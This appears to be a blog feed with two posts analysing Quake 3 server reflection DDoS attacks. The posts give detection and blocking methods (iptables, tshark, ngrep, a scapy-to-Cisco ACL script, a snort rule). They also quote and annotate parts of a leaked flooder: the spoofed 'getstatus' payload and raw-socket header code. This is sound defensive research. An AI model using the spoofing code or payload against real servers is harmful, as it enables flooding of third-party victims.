<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: forensics | Alejandro Nolla - z0mbiehunt3r]]></title>
  <link href="http://blog.alejandronolla.com/blog/categories/forensics/atom.xml" rel="self"/>
  <link href="http://blog.alejandronolla.com/"/>
  <updated>2013-08-06T16:55:28+02:00</updated>
  <id>http://blog.alejandronolla.com/</id>
  <author>
    <name><![CDATA[Alejandro Nolla]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Amplification DDoS attack with Quake3 servers: An analysis(2/2)]]></title>
    <link href="http://blog.alejandronolla.com/2013/08/05/amplification-ddos-attack-with-quake3-servers-an-analysis-2-slash-2/"/>
    <updated>2013-08-05T14:49:00+02:00</updated>
    <id>http://blog.alejandronolla.com/2013/08/05/amplification-ddos-attack-with-quake3-servers-an-analysis-2-slash-2</id>
    <content type="html"><![CDATA[<h2>Mitigating at the Quake 3 server side</h2>

<p>If we search a bit about Quake 3 servers being used to carry on DDoS attacks we will find this kind of attack <a href="http://www.lemuria.org/security/application-drdos.html">is known</a> since some years ago and, in fact, not only Quake 3 are prone to this type of attack but others games based on Quake 3 engine as well (as COD).</p>

<p>I decided to dig into ioq3 server code to see if there is any kind of mitigation for this type of attack, grep in hand:<br/>
``` bash greping for potentially interesting strings
~/ioq3/code/server$ grep -iRn 'flood' *
server.h:291:extern cvar_t  <em>sv_floodProtect;
sv_client.c:36:flood the server with invalid connection IPs.  With a
sv_client.c:78: // excess outbound bandwidth usage when being flooded inbound
sv_client.c:1621:   // including the usercmd.  This causes flooders to lag themselves
sv_client.c:1627:       sv_floodProtect->integer &amp;&amp;
sv_client.c:1979:           return; // we couldnt execute it because of the flood protection
sv_init.c:649:  sv_floodProtect = Cvar_Get ("sv_floodProtect", "1", CVAR_ARCHIVE | CVAR_SERVERINFO );
sv_main.c:58:cvar_t </em>sv_floodProtect;
sv_main.c:550:  // excess outbound bandwidth usage when being flooded inbound
sv_main.c:613:  // excess outbound bandwidth usage when being flooded inbound</p>

<p>~/ioq3/code/server$ grep -iRn 'amplif' *
sv_client.c:70: // Prevent using getchallenge as an amplifier
sv_main.c:542:  // Prevent using getstatus as an amplifier
sv_main.c:605:  // Prevent using getinfo as an amplifier
sv_main.c:712:  // Prevent using rcon as an amplifier and make dictionary attacks impractical</p>

<p>~/ioq3/code/server$ grep -iRn 'dosed' *
sv_client.c:77: // Allow getchallenge to be DoSed relatively easily, but prevent
sv_main.c:549:  // Allow getstatus to be DoSed relatively easily, but prevent
sv_main.c:612:  // Allow getinfo to be DoSed relatively easily, but prevent
```</p>

<p>It seems that ioq3 developers have integrated some mitigating mechanisms against DDoS attacks, both when Q3 server is being used as an amplifier and when Q3 is directly attacked with a traffic flood, so take a deeper look into those mechanisms:<br/>
``` c++ ioq3 DDoS detection and mitigation mechanisms - sv_main.c:542</p>

<pre><code>// Prevent using getstatus as an amplifier
if ( SVC_RateLimitAddress( from, 10, 1000 ) ) {
    Com_DPrintf( "SVC_Status: rate limit from %s exceeded, dropping request\n",
        NET_AdrToString( from ) );
    return;
}
</code></pre>

<p>```</p>

<p>When an IP address sends a "getstatus" command some checks are done prior of let command passing, "SVC_BucketForAddress( from, burst, period )" call will look for associated data to "getstatus" sender IP address:<br/>
``` c++ ioq3 DDoS detection and mitigation mechanisms - sv_main.c:505</p>

<h1>/*</h1>

<p>SVC_RateLimitAddress</p>

<h1>Rate limit for a particular address</h1>

<p>*/
qboolean SVC_RateLimitAddress( netadr_t from, int burst, int period ) {</p>

<pre><code>leakyBucket_t *bucket = SVC_BucketForAddress( from, burst, period );

return SVC_RateLimit( bucket, burst, period );
</code></pre>

<p>}
```</p>

<p>Now ioq3 will check if sender IP address has exceeded established rate limit, being it 10 commands in just one second period (remember previous call <em>"if ( SVC_RateLimitAddress( from, 10, 1000 ) )"</em>):<br/>
``` c++ ioq3 DDoS detection and mitigation mechanisms - sv_main.c:475</p>

<h1>/*</h1>

<h1>SVC_RateLimit</h1>

<p><em>/
qboolean SVC_RateLimit( leakyBucket_t </em>bucket, int burst, int period ) {</p>

<pre><code>if ( bucket != NULL ) {
    int now = Sys_Milliseconds();
    int interval = now - bucket-&gt;lastTime;
    int expired = interval / period;
    int expiredRemainder = interval % period;

    if ( expired &gt; bucket-&gt;burst ) {
        bucket-&gt;burst = 0;
        bucket-&gt;lastTime = now;
    } else {
        bucket-&gt;burst -= expired;
        bucket-&gt;lastTime = now - expiredRemainder;
    }

    if ( bucket-&gt;burst &lt; burst ) {
        bucket-&gt;burst++;

        return qfalse;
    }
}

return qtrue;
</code></pre>

<p>}
```</p>

<p>As seen, ioq3 server implements some mitigation techniques to avoid using servers as amplifiers but, because they are based on rate limits, an attacker could use them sending at lower rates to avoid being filtered by amplifiers servers, circumventing this protection. A good approach to this type of attack could be implementing challenge-response methods in the game protocol to avoid sending big answers to requests that doesn't contain a valid challenge token. Because of the nature of this kind of protection, an attacker shouldn't be able to spoof the token request and get it to use in spoofed "getstatus" query nor predict a valid token to avoid token request phase and just use a pre-generated token in spoofed "getstatus" request (as well as being unable to doing a replay attack using previously used tokens), probably I am going to write another more detailed post about this and other stuff I found while doing some research in the future.</p>

<p>On a similar way to ioq3 server implementation mitigation techniques we could set up an iptables rate limiting policy to automatically drop <em>any</em> traffic from spoofed IP addresses (victim or victims) at layer three and avoid wasting resources on their processing.</p>

<p>I have just totally ripped off this iptables rules from <a href="http://www.quake.ie/blogs/rawshark/preventing-ddos-attacks-quake-3-server.php">here</a>, so credit goes to <a href="http://www.quake.ie/users/rawshark">RawShark</a>:
``` bash iptables mitigation of Quake 3 DDoS amplification attack</p>

<h1>create chain</h1>

<p>iptables -N quake3_ddos</p>

<h1>accept real client/player traffic</h1>

<p>iptables -A quake3_ddos -m u32 ! --u32 "0x1c=0xffffffff" -j ACCEPT</p>

<h1>match "getstatus" queries and remember their address</h1>

<p>iptables -A quake3_ddos -m u32 --u32 "0x20=0x67657473&amp;&amp;0x24=0x74617475&amp;&amp;0x25&amp;0xff=0x73" -m recent --name getstatus --set</p>

<h1>drop packet if "hits" per "seconds" is reached</h1>

<p>#</p>

<h1>NOTE: if you run multiple servers on a single host, you will need to higher these limits</h1>

<h1>as otherwise you will block regular server queries, like Spider or QConnect</h1>

<h1>e.g. they will query all of your servers within a second to update the list</h1>

<p>iptables -A quake3_ddos -m recent --update --name getstatus --hitcount 5 --seconds 2 -j DROP</p>

<h1>accept otherwise</h1>

<p>iptables -A quake3_ddos -j ACCEPT</p>

<p>#
#</p>

<h1>finally insert the chain as the top most input filter</h1>

<h1>single server</h1>

<h1>iptables -I INPUT 1 -p udp --dport 27960 -j quake3_ddos</h1>

<h1>multiple servers</h1>

<p>iptables -I INPUT 1 -p udp --dports 27960,27961,27962 -j quake3_ddos
```</p>

<p>Only lef to say we only filtered "getstatus" command with those iptables rules, remember the others commands as well.</p>

<h2>Hunting it down across the network</h2>

<p>Once we know the ins and outs of this type of DDoS attack and analyzed generate network traffic, as well as readed tool code, we are closer of being able to spot this way of flood and trying to mitigate it. We need to have in mind the fact that, lower TCP/IP layer used to detect anomalous traffic patterns, lower use of resources; it will be much easier to stop a datagram at network layer - maybe based in IP addresses of known Quake 3 servers ;) - than going up to application layer trying to stop a datagram based on its payload and, when dealing with attacks of dozens or hundred of Gbs, the difference will be crucial.</p>

<h3>Using tshark for network analysis</h3>

<p><a href="http://www.wireshark.org/docs/wsug_html_chunked/AppToolstshark.html">tshark</a> is a terminal based version of Wireshark for doing powerful and quick network packet capturing/analysis and is really useful when doing network forensics because we can use Wireshark's <a href="http://wiki.wireshark.org/DisplayFilters">DisplayFilters</a> including <a href="http://www.wireshark.org/docs/dfref/">a lot</a> of supported protocols.</p>

<p>Also, if you are interested in tshark/network analysis, I highly recommend <a href="http://www.packtpub.com/traffic-analysis-with-tshark/book">this</a> ebook called "Instant Traffic Analysis with Tshark How-to" and written by <a href="https://twitter.com/BorjaMerino">Borja Merino</a>, it offers a quick and really useful set of recipes for analyzing traffic with tshark, totally worths it.</p>

<p>For example, let's specify tshark to show Quake 3 datagrams (using <a href="http://anonsvn.wireshark.org/wireshark/trunk/epan/dissectors/packet-quake3.c">quake3 dissector</a>) with a UDP length of 22 bytes (we could set <a href="http://www.wireshark.org/docs/dfref/q/quake3.html">more specific options</a>):</p>

<p><code>bash network forensics with tshark
$ tshark -r udp_quake3.pcap.cloaked -R 'udp.length == 22 &amp;&amp; quake3'
 33   0.002043  128.66.0.32 -&gt; 128.66.7.9   QUAKE3 60 Connectionless Unknown
 50   0.003085 128.66.142.197 -&gt; 128.66.7.9   QUAKE3 60 Connectionless Unknown
 83   0.005171 128.66.227.122 -&gt; 128.66.7.9   QUAKE3 60 Connectionless Unknown
106   0.006501  128.66.78.4 -&gt; 128.66.7.9   QUAKE3 60 Connectionless Unknown
124   0.007610 128.66.249.35 -&gt; 128.66.7.9   QUAKE3 60 Connectionless Unknown
129   0.007930 128.66.238.141 -&gt; 128.66.7.9   QUAKE3 60 Connectionless Unknown
140   0.008582 128.66.189.147 -&gt; 128.66.7.9   QUAKE3 60 Connectionless Unknown
144   0.008812 128.66.238.48 -&gt; 128.66.7.9   QUAKE3 60 Connectionless Unknown
147   0.009012 128.66.249.35 -&gt; 128.66.7.9   QUAKE3 60 Connectionless Unknown
157   0.009582 128.66.75.113 -&gt; 128.66.7.9   QUAKE3 60 Connectionless Unknown
179   0.010909 128.66.238.48 -&gt; 128.66.7.9   QUAKE3 60 Connectionless Unknown
</code></p>

<p>By default tshark will print info with this format "frame number; relative time; source IP; destination IP; dissected protocol; frame size (bytes); protocol dissected info" as shown above but it isn't well formatted for an easy processing, so let's say tshark to show output as formatted CSV:</p>

<p><code>bash tshark csv output
$ tshark -r udp_quake3.pcap.cloaked -R 'udp.length == 22 &amp;&amp; quake3' -T fields -E separator=';' -e ip.src -e udp.srcport -e ip.dst
128.66.79.215;27960;128.66.7.9
128.66.159.73;27960;128.66.7.9
128.66.119.203;27960;128.66.7.9
128.66.58.250;27960;128.66.7.9
128.66.232.7;27960;128.66.7.9
128.66.120.133;27960;128.66.7.9
128.66.212.39;27960;128.66.7.9
128.66.156.90;27960;128.66.7.9
128.66.189.147;27960;128.66.7.9
128.66.160.78;27960;128.66.7.9
128.66.29.104;27960;128.66.7.9
128.66.143.194;27960;128.66.7.9
128.66.188.75;27960;128.66.7.9
128.66.221.179;27960;128.66.7.9
</code></p>

<p>Now we could make a script to consume tshark output and deploy firewall rules in almost real-time or, maybe, make some pretty statistics for the unavoidable report once the attack has finished / been mitigated.</p>

<p>Probably you are asking yourself the reason I specified an UDP length of 22 bytes, so take a look to the structure of an UDP datagram:<br/>
<img src="/images/upload/2013/08/udp_header.png"></p>

<p>As we saw when analyzing udp.c code and his mistakes, an UDP header size is 8 bytes plus any payload, because in this case we have a payload of 14 <em>("....disconnect")</em> bytes it does a total sum of 22 bytes for a triggered response of "disconnect" (response provoked by bad seted UDP length in original udp.c code) so it would be useful against this specific bad coded version of attackers' tool, despite of it should be improved and/or adapted for others versions of scripts or for a well carried spoofed attack in which Quake 3 servers will answer with server info and no with a "disconnect" command.</p>

<p>At last but not least, tshark also allow to use Wireshark's "<a href="http://www.wireshark.org/docs/man-pages/wireshark-filter.html">contains</a>" and "match" filters to show only those packets with a specific pattern:
<code>bash thsark filtering UDP datagrams with "....disconnect" text
$ tshark -r udp_quake3.pcap.cloaked -R 'udp contains ff:ff:ff:ff:64:69:73:63:6f:6e:6e:65:63:74'
 33   0.002043  128.66.0.32 -&gt; 128.66.7.9   QUAKE3 60 Connectionless Unknown
 50   0.003085 128.66.142.197 -&gt; 128.66.7.9   QUAKE3 60 Connectionless Unknown
 70   0.004313 128.66.143.168 -&gt; 128.66.7.9   UDP 60 Source port: 27967  Destination port: 65511
 79   0.004898 128.66.12.63 -&gt; 128.66.7.9   UDP 60 Source port: 27003  Destination port: 13190
 81   0.005006 128.66.239.175 -&gt; 128.66.7.9   UDP 60 Source port: 27990  Destination port: 5475
 83   0.005171 128.66.227.122 -&gt; 128.66.7.9   QUAKE3 60 Connectionless Unknown
106   0.006501  128.66.78.4 -&gt; 128.66.7.9   QUAKE3 60 Connectionless Unknown
</code></p>

<p>When comparing these results against the previous ones we can observe more amplifiers servers because we are not relying on UDP source port but in UDP payload content to detect them.</p>

<h3>Using ngrep to build iptables rules</h3>

<p><a href="http://ngrep.sourceforge.net/">ngrep</a> is a network troubleshooting tool that allow us to analyze previously captured traffic in a pcap file or a life sniffing session to debug traffic in a similar way like "grep" Unix tool, his primary goal is to parse and display plaintext protocols like HTTP or SMTP.</p>

<p>In this case we are going to "grep" for a "....disconnect" string specifying to don't print hash marks (-q) :<br/>
``` bash network forensic with ngrep
$ ngrep -q -I udp_quake3.pcap.cloaked '\xFF\xFF\xFF\xFFdisconnect'
U 128.66.238.228:27961 -> 128.66.7.9:26457
....disconnect....</p>

<p>U 128.66.0.103:27960 -> 128.66.7.9:65247
....disconnect....</p>

<p>U 128.66.217.157:27960 -> 128.66.7.9:48320
....disconnect....</p>

<p>U 128.66.238.48:27960 -> 128.66.7.9:32267
....disconnect....</p>

<p>U 128.66.132.204:27960 -> 128.66.7.9:58316
....disconnect....</p>

<p>U 128.66.168.194:27993 -> 128.66.7.9:12525
....disconnect....</p>

<p>U 128.66.168.248:27961 -> 128.66.7.9:8946
....disconnect....
```</p>

<p>While this format is easy to read by a human we would need to parse it prior to doing any kind of filtering. For example, we could parse this output to just show Quake 3 amplifiers servers being used in the attack to generate some type of firewall rule:</p>

<p><code>bash parsing ngrep output to get just amplifiers IP addresses
$ ngrep -q -I udp_quake3.pcap.cloaked '\xFF\xFF\xFF\xFFdisconnect' | awk '/U [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+:[0-9]+/{print $2}' | cut -d ':' -f 1 | sort -u
128.66.99.246
128.66.99.28
192.0.2.155
192.0.2.239
192.0.2.45
198.51.100.213
198.51.100.225
198.51.100.65
203.0.113.120
</code></p>

<p>We could go a step ahead and create a set of DROP rules for a Linux router with iptables beyond parsing ngrep output:
<code>bash generating iptables rules based on ngrep output
$ for ip in `ngrep -q -I udp_quake3.pcap.cloaked '\xFF\xFF\xFF\xFFdisconnect' | awk '/U [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+:[0-9]+/{print $2}' | cut -d ':' -f 1 | sort -u`; do echo "iptables -A FORWARD -s $ip -j DROP" &gt;&gt; quake3_ddos.iptables; done
$ head -n 5 quake3_ddos.iptables
iptables -A FORWARD -s 128.66.0.103 -j DROP
iptables -A FORWARD -s 128.66.0.18 -j DROP
iptables -A FORWARD -s 128.66.0.181 -j DROP
iptables -A FORWARD -s 128.66.0.246 -j DROP
iptables -A FORWARD -s 128.66.0.27 -j DROP
</code></p>

<h3>Parsing attack with scapy and automatic deployment of a Cisco IOS access-list</h3>

<p>Ok, analyzing network traffic and spotting attack patterns is fun, but analyzing traffic looking for previously spotted pattern and automatically blocking attacking IP addresses at perimetral routers is far better, so I'm going to explain how to make such easy but powerful script in a few lines with python.</p>

<p>We are going to need <a href="http://www.secdev.org/projects/scapy/">scapy</a> again as well as <a href="https://github.com/knipknap/exscript/wiki">exscript</a> module to interact with Cisco routers. Then we just need to analyze UDP datagrams and look for "....disconnect" or "....statusResponse" in payload content to list Quake 3 servers being used as amplifiers, once done only remains to create access-list entries for those IP address.</p>

<p>Here is an example for doing this process:<br/>
``` python quake3_ddos_parser.py</p>

<h1>!/usr/bin/env python</h1>

<h1>coding:utf-8</h1>

<h1>Author: Alejandro Nolla - z0mbiehunt3r</h1>

<h1>Purpose: Example for identifying Quake 3 amplifiers and block them with Cisco access-list</h1>

<h1>Created: 21/06/13</h1>

<p>import sys</p>

<p>try:</p>

<pre><code>from Exscript.util.interact import read_login
from Exscript.protocols import SSH2
</code></pre>

<p>except ImportError:</p>

<pre><code>print 'You need exscript (https://github.com/knipknap/exscript)'
sys.exit(-1)
</code></pre>

<p>import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # supress everything below error
try:</p>

<pre><code>from scapy.all import rdpcap
</code></pre>

<p>except ImportError:</p>

<pre><code>print 'You need scapy (http://www.secdev.org/projects/scapy/)'
sys.exit(-1)
</code></pre>

<h1>----------------------------------------------------------------------</h1>

<p>def extract_quake3_amplifiers(pcap_file_path):</p>

<pre><code>"""
It will classify an IP address as an amplifier if UDP payload
consists of "....disconnect" or "....statusResponse" command

@param pcap_file_path: Path to pcap file to parse
@type pcap_file_path: str

@return: Set with amplifiers servers
@rtype: set
"""

amplifiers_servers = set()

'''
rdpcap will read all packets at once, if you need to read
it sequentially take a look to PcapReader
http://www.sourcecodebrowser.com/scapy/1.0.2/classscapy_1_1_pcap_reader.html
'''
packets = rdpcap(pcap_file_path, count=1000)

for packet in packets:
    if not packet.haslayer('UDP'):
        continue
    if packet.haslayer('Raw'):
        raw_udp_payload = packet.getlayer('Raw')
        ip_layer = packet.getlayer('IP')
        if raw_udp_payload.load == '\xff\xff\xff\xffdisconnect' or\
           raw_udp_payload.load[0:18] == '\xff\xff\xff\xffstatusResponse':
            amplifiers_servers.add(ip_layer.src)

return amplifiers_servers
</code></pre>

<p>if <strong>name</strong>=='<strong>main</strong>':</p>

<pre><code>PCAP_FILE = './udp_quake3.pcap.cloaked'
print '''Example of Quake 3 DDoS amplification attack parser to automatically deploy Cisco IOS access-list
- by Alejandro Nolla (z0mbiehunt3r)'''
print '[*] Parsing %s' %PCAP_FILE

amplifiers_servers = extract_quake3_amplifiers(PCAP_FILE)

print '[+] Got %i amplifiers servers being used in the attack...' %len(
                                                                      amplifiers_servers)

account = read_login() # read login from prompt
conn = SSH2()
conn.connect('192.168.1.245')
conn.login(account)
print conn.response

conn.execute('config t')
print conn.response
# create access-list
print '[!] Deploying access-list, take a coffee...'
conn.execute('ip access-list extended quake3_ddos')

for server in amplifiers_servers:
    '''
    here we directly block IP protocol but we could block UDP for Quake 3
    responses and ICMP protocol for traffic potentially being generated
    for hosts/ports unreachable and so on typical in DDoS attacks
    (backscatter effect)

    Also, we could block only ports being used in the attack (game ones, finite)
    '''
    conn.execute('deny ip host %s any' %server) # add one rule per amplifier

# caution with implicit deny (legitimate users' traffic, routing protocols, etc)
conn.execute('permit ip any any')
# apply access-list to interface
conn.execute('interface fastEthernet 1/1')
conn.execute('ip access-group quake3_ddos in')
# quick'n dirty way for copy running-config startup-config
conn.execute('do wr')
print conn.response

conn.send('exit\r')
conn.close()

print '[-] SLD-26 shield deployed'
</code></pre>

<p>```</p>

<p>Time to execute it and await, it's going to take his time when processing a real DDoS capture (millions of packets), so it's highly recommended to make a prior filter with tshark and adapt this script to use multiple CPUs (or programming it in C):<br/>
``` bash parsing and generating access-list
$ python quake3_ddos_parser.py
Example of Quake 3 DDoS amplification attack parser to automatically deploy Cisco IOS access-list</p>

<pre><code>- by Alejandro Nolla (z0mbiehunt3r)
</code></pre>

<p>[*] Parsing ./udp_quake3.pcap.cloaked
[+] Got 455 amplifiers servers being used in the attack...
Please enter your user name [z0mbiehunt3r]: cisco
Please enter your password:</p>

<p>Endor#
config t
Enter configuration commands, one per line.  End with CNTL/Z.
Endor(config)#
[!] Deploying access-list, take a coffee...
do wr
Building configuration...
[OK]
Endor(config-ext-nacl)#
[-] SLD-26 shield deployed
```</p>

<p>Now connect to our router and check if everything went ok:<br/>
``` ios checking access-list for quake 3 amplifiers
Endor> enable
Endor# show ip access-lists quake3_ddos
Extended IP access list quake3_ddos</p>

<pre><code>10 deny ip host 192.0.2.239 any
20 deny ip host 128.66.194.14 any
30 deny ip host 128.66.233.82 any
40 deny ip host 128.66.186.59 any
50 deny ip host 128.66.150.252 any
[...]
</code></pre>

<p>```</p>

<p>Well, so it seems access-list was created ok, attack traffic should begin to be dropped (at filtering router) in seconds, time to figure out next attack vector that will try being exploited, attackers will move to another technique for sure.</p>

<h3>Creating a snort rule</h3>

<p>If we have a snort sensor or IPS system we could create specific rules based on detected attack pattern to protect us against analyzed DDoS technique. Anyway, going up to application layer is highly discouraged to mitigate a real DDoS attack because it will require more CPU and RAM to process each packet not only because of unwrapping more layers but because specific "simple" filtering actions like filtering on IP addresses and/or ports are performed through packet forwarding hardware (<a href="http://en.wikipedia.org/wiki/Application-specific_integrated_circuit">ASIC</a>) and will be far better than a CPU filtering approach done in most majority of appliances.</p>

<p>For testing purposes I have used a <a href="http://securityonion.blogspot.com.es/">security onion</a> virtual machine with snort and <a href="https://snorby.org/">snorby</a> running for capturing and visualizing alerts respectively. To create a snort rule to detect inbound DDoS amplification attack using Quake 3 servers we are going to look for "...disconnect" (again it works only for analyzed script and should be extended to the others already analyzed caseloads) in UDP payload, now it's time to read <a href="http://manual.snort.org/node27.html">"Writing Snort Rules"</a>:<br/>
``` bash detecting attack with snort</p>

<h1>vim /etc/nsm/rules/local.rules</h1>

<p>alert udp any any -> any any (msg:"Quake 3 DDoS amplification attack INBOUND"; content:"|ff ff ff ff 64 69 73 63 6f 6e 6e 65 63 74|"; nocase; offset:0; depth:14; sid:1000666; rev:1;)</p>

<h1>rule-update</h1>

<p>```</p>

<ul>
<li>alert udp any any -> any any: analyze any source:port to any destination:port if UDP</li>
<li>content: tell snort hex string to search</li>
<li>nocase: in a no case sensitive way</li>
<li>offset: start analyzing in offset 0 for payload</li>
<li>depth: and only up to next 14 bytes (for speed optimization, size of content searched)</li>
</ul>


<p>If we create this rule and use scapy as shown before to send a UDP datagram with this pattern an alert will be triggered and a new event will be shown in our snorby interface:<br/>
<img src="/images/upload/2013/08/snorby_rule.png"></p>

<p>If we analyze with attention the previous image we are can see IP ToS, TTL, UDP length and payload as previously analyzed, so it seems our patterns works fine (despited of it should be improved).</p>

<h2>Conclusions</h2>

<p>After spending some weeks researching about this kind of attack vector -using several games servers as amplifiers- I'm sure it's an attack that can be really powerful to launch storms of spoofed UDP datagrams with almost no cost or effort at all, it's really easy to get an almost real time updated list of online servers without having to make any kind of port scanning but just parsing online gaming directories and, to make matters worse, amplification factors can be up to several dozens original throughput and, because this kind of attack is less known, IT people will be less aware and ready to face off such techniques.</p>

<p>The fact that this kind of attack is being actively used in DDoS as a service platforms to launch attacks from several web booters makes important to know this attack, how to detect it and how to try to defend against him, so stay alert and see you at next post!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Amplification DDoS attack with Quake3 servers: An analysis (1/2)]]></title>
    <link href="http://blog.alejandronolla.com/2013/06/24/amplification-ddos-attack-with-quake3-servers-an-analysis-1-slash-2/"/>
    <updated>2013-06-24T13:52:00+02:00</updated>
    <id>http://blog.alejandronolla.com/2013/06/24/amplification-ddos-attack-with-quake3-servers-an-analysis-1-slash-2</id>
    <content type="html"><![CDATA[<h2>Introduction</h2>

<p>Lately has been growing in popularity those DDoS attacks based on <a href="http://www.us-cert.gov/ncas/alerts/TA13-088A">DNS Amplification</a>, specifically due to the <a href="http://blog.cloudflare.com/the-ddos-that-almost-broke-the-internet">attack</a> to Spamhaus. While this kind of attack is becoming more and more popular at DDoS scenarios there are others types of DDoS techniques being used not so common and which should be known before being hitted by them. In this post i want to introduce amplification attacks using Quake 3 network protocol - UDP based - as well as how to analyze it in several ways to really understand it in depth to find a pattern and create a fingerprint for trying mitigating them. <!-- more --></p>

<h2>How does this attack works</h2>

<p>This kind of DDoS is very similar to a DNS Amplification Attack, an attacker send thousands of UDP datagrams pretending to be a legitimate Quake 3 client asking for game status with source IP address spoofed using the one wanted to be flooded, then, queried Quake 3 servers will answer with game status - including some server configuration options and user list - to spoofed source IP address, flooding it with thousands of unsolicited UDP datagrams.</p>

<p>I have done a basic draw for illustrating it:<br/>
<img src="/images/upload/2013/06/quake3_ddos.png"></p>

<p>As shown, amplifiers servers - Quake 3 ones - will flood victim with an aggregated throughput much higher than the used by attacker (hence it "amplifier" term); lets see some traffic generated if we make this "getstatus" request:<br/>
``` bash showing some info about getstatus request with tshark
$ tshark -r udp_quake3_reflected_clean.pcap.cloaked -z conv,udp
  1   0.000000 192.168.1.39 -> 128.66.0.59  QUAKE3 56 Connectionless Client to Server</p>

<h1>  2   0.213635  128.66.0.59 -> 192.168.1.39 QUAKE3 1373 Connectionless Server to Client</h1>

<p>UDP Conversations
Filter:<No Filter></p>

<pre><code>                                           |       &lt;-      | |       -&gt;      | |     Total     |
                                           | Frames  Bytes | | Frames  Bytes | | Frames  Bytes |
</code></pre>

<h1>192.168.1.39:32511   <-> 128.66.0.59:27960          1      1373       1        56       2      1429</h1>

<p>```</p>

<p>If we calculate amplification ratio we find that sending an UDP datagram of 56 bytes will trigger a response of 1373 bytes, achieving about x24,5 amplification ratio, not bad after all.</p>

<h2>Installing Quake 3 server (amplifier)</h2>

<p>We are going to need a Quake 3 server for being used as "amplifier" to attack our victim when doing some local tests, so we are going to need an original copy of Quake 3 and compiling <a href="http://ioquake3.org/">ioquake3</a>, an open source Quake 3 engine based on id Software source code (publicly released in 2005).<br/>
``` bash installing prerequisites and ioquake3 server</p>

<h1>apt-get install libsdl1.2-dev -y</h1>

<p>~$ git clone git://github.com/ioquake/ioq3.git
~$ cd ioq3/
~/ioq3$ make
```</p>

<p>Now we need to copy Quake 3 original pak files (those with models and textures) from our cdrom to our hdd prior being able to run an ioq3 server:
``` bash copying pak files to our hdd and starting ioq3 server
~$ mkdir .baseq3
/quake3/baseq3$ cp *.pk3 /home/z0mbiehunt3r/.q3a/baseq3
~$ # now start server
~/ioq3/build/release-linux-x86_64$ ./ioq3ded.x86_64 +set net_ip YOUR_LAN_IP +map q3dm1
ioq3 1.36_GIT_7b15415-2013-06-10 linux-x86_64 Jun 15 2013
Have SSE support
[...]
Hunk_Clear: reset the hunk ok
--- Common Initialization Complete ---
IP: 127.0.0.1
IP: 192.168.1.39
Opening IP socket: 192.168.1.39:27960
[...]
------------ Map Loading ------------
trying to load maps/q3dm1.aas
loaded maps/q3dm1.aas</p>

<h2>found 18 level items</h2>

<p>32 bots parsed
35 arenas parsed</p>

<h2>AAS initialized.</h2>

<p>]
```</p>

<p>Our ioq3 server is ready to make some frags!, we can check it with <a href="http://nmap.org/nsedoc/scripts/quake3-info.html">quake3-info.nse</a> script:<br/>
``` bash scanning our Quake 3 server with nmap</p>

<h1>./nmap -sU -p27960 -Pn -n 192.168.1.39 --reason --script=quake3-info</h1>

<p>Starting Nmap 6.26SVN ( http://nmap.org ) at 2013-06-16 00:23 CEST
Nmap scan report for 192.168.1.39
Host is up, received user-set (0.00021s latency).
PORT      STATE SERVICE REASON
27960/udp open  quake3  udp-response
| quake3-info:
|   BASIC OPTIONS:
|     capturelimit: 8
|     dmflags: 0
|     fraglimit: 20
|     gamename: baseq3
|     mapname: q3dm1
|     timelimit: 0
|     version: ioq3 1.36_GIT_7b15415-2013-06-10 linux-x86_64 Jun 15 2013
|   OTHER OPTIONS:
|     bot_minplayers: 0
|     com_gamename: Quake3Arena
|     com_protocol: 71
|     g_gametype: 0
|     g_maxGameClients: 0
|     g_needpass: 0
|     sv_allowDownload: 0
|     sv_dlRate: 100
|     sv_floodProtect: 1
|     sv_hostname: c0meG3tS0m3
|     sv_maxPing: 0
|     sv_maxRate: 0
|     sv_maxclients: 8
|     sv_minPing: 0
|     sv_minRate: 0
|_    sv_privateClients: 0
Service Info: OS: Linux</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds
```</p>

<h2>Analyzing attackers script</h2>

<p>Commonly used scripts for this kind of attacks has been leaked repeatedly so i'm not going to hide it (regardless of the fact those who DDoS already have it or more powerful attack vectors), so <a href="/images/upload/2013/06/udp.c">here</a> is a C Quake 3 amplification flooder made upon a generic UDP flooder.</p>

<p>It's interesting the way UDP datagrams are assembled, so let's go to analyze it (thanks to <a href="https://twitter.com/NighterMan">NighterMan‎</a> for helping me with my rusted C knowledge), i have made some comments below about found mistakes, particularly at networking knowledge (the tool doesn't even work rigth to trigger amplified response):<br/>
``` c Quake 3 DDoS amplification attack function
[...]
// this is the UDP payload for "geststatus" message
param.message = "\xFF\xFF\xFF\xFF\x67\x65\x74\x73\x74\x61\x74\x75\x73\x10";
[...]</p>

<p>/<em>
attack function is called with following args, being params->list[i].ip and params->list[i].port Quake 3 server data
attack(params->victim_ip, rand() % 65534 + 1, params->list[i].ip, params->list[i].port, params->message);
</em>/</p>

<p>void attack(unsigned long srcip, int srcport, unsigned long destip, int destport, char *message)
{</p>

<pre><code>/*
When sending TCP/UDP segments/datagrams with raw sockets we need a pseudo header to calculate checksum value,
not used in this case and probably forgot when ripping it from this SYN flooder
https://gist.github.com/z0mbiehunt3r/5790220
*/
struct pseudo_header psh;

sin.sin_family = AF_INET;
sin.sin_port = htons(destport);
sin.sin_addr.s_addr = destip;

memset (packet, 0, 4096);

/*
To read more about Internet Header Length and Type Of Service check rfc791
https://tools.ietf.org/html/rfc791#page-11
*/
iph-&gt;ihl = 5;
iph-&gt;version = 4;

/*
Actually ToS field in IP header is made up of a six bit "Differentiated services field"
and two bit "Explicit Congestion Notification" field.

Read http://tools.ietf.org/html/rfc2474 and http://tools.ietf.org/html/rfc3168 about them

Explicit Congestion Notification set as a Not ECN-Capable Transport, probably with intention
of bypassing/messing around congestion mitigation mechanisms ;)
*/
iph-&gt;tos = 16;

iph-&gt;tot_len = sizeof (struct ip) + sizeof (struct udphdr) + strlen(message);
// htonl will produce a long instead of a short (IPID value is 16 bits), kernel will fix this value
iph-&gt;id = htonl (54321); 
iph-&gt;frag_off = 0;
iph-&gt;ttl = 255;
iph-&gt;protocol = IPPROTO_UDP;
// rely IP header checksum to kernel
iph-&gt;check = 0; 
iph-&gt;saddr = srcip; 
iph-&gt;daddr = sin.sin_addr.s_addr;

udph-&gt;source = htons(srcport);
